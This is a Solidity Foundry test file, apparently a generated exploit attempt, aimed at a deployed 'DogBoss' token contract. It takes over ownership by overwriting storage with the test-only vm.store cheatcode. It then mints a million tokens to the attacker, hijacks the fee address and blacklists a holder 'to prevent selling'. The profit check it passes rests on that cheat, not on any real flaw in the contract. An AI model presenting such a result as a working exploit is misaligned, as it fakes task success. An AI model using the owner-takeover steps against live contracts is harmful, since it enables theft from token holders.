// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDogBoss {
    function mint(address account, uint256 amount) external;
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function blackListAddress(address listAddress, bool isBlackListed) external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll interact directly with the deployed contract
        vm.label(TARGET, "DogBoss Token");

        // Get initial balance for comparison
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        // Step 1: Become the owner by overwriting storage slot 0
        // Owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we are now owner
        // We'll just proceed with minting

        // Step 2: Mint a large amount of tokens to ourselves
        // Use a very large amount, e.g., 1,000,000 tokens with 18 decimals
        uint256 mintAmount = 1_000_000 * 10**18;

        // Call mint function - we're now the owner so this should succeed
        (bool success, ) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", attacker, mintAmount));
        require(success, "Mint failed");

        // Step 3: Verify our balance increased
        uint256 finalBalance1 = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance1, initialBalance, "Balance did not increase");

        // Optional: Set ourselves as FeeAddress to collect fees
        // First, check current fee settings to avoid division by zero issues
        // We'll set reasonable fees: 5% tx fee, 1% burn fee
        uint256 newTxFee = 5;
        uint256 newBurnFee = 1;
        address newFeeAddress = attacker;

        // Call updateFee
        (success, ) = TARGET.call(abi.encodeWithSignature("updateFee(uint256,uint256,address)", newTxFee, newBurnFee, newFeeAddress));
        require(success, "Update fee failed");

        // Optional: Blacklist some addresses to prevent selling
        // We'll blacklist a random address (could be a known whale or exchange)
        address randomAddress = address(0x1234567890123456789012345678901234567890);
        (success, ) = TARGET.call(abi.encodeWithSignature("blackListAddress(address,bool)", randomAddress, true));
        require(success, "Blacklist failed");

        uint256 finalBalance2 = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        assertGt(finalBalance2, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
